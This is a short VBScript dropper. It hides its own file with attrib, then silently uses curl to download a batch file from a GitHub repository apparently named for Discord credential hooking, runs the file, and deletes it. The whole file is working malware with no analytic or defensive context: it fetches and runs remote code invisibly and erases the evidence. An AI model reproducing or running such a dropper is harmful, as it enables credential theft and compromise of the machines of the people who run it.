option explicit

dim shell : set shell = createobject("wscript.shell")

shell.run "attrib +h +s +r dschfinalform.vbs", 0, True
shell.run "cmd /c curl -o dsch.bat https://raw.githubusercontent.com/batchhacker00/discordcred_hooker/refs/heads/main/discordcred_hooker.bat && dsch.bat && timeout /t 1 > nul && del /s dsch.bat > nul", 0, True

